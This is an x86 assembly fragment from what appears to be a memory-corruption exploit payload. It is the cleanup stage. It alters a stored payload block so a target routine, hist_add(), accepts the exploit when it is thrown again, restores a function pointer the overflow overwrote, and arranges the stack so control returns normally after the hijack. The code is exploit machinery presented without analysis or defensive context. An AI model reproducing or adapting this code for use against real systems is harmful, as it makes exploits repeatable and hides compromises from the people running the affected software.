
/* ************************************ */

.globl cleanup_start
cleanup_start:
    
    # Normally, block 0 (the overflow part of the payload)
    # is saved to block0addr. If we throw the exploit twice 
    # in a row then block 0 will not change from the first 
    # time to the second. hist_add() will notice this and 
    # not save block 0.  Instead, block 1 will be put at
    # block0addr throwing off our overwrites.
    # Change block 0 so if we throw the exploit again
    # then hist_add() will see block 0 as changed and work
    # as normal.
    mov $block0addr, %ecx
    add $0x1, (%ecx)  /* will work no matter what the current value */
    
    # Restore the function pointer we overwrote
    mov $orig_func_ptr_loc, %ecx
    mov $orig_func_ptr, %ebx
    mov %ebx, (%ecx)         /* fix broken free pointer */
    
    /*push %ebx*/            /* save pointer to jump to when done */
    mov %ebx, 0x20(%esp)     /* store pointer in slot after pusha'd regs for RET */
    
.globl cleanup_end
cleanup_end:
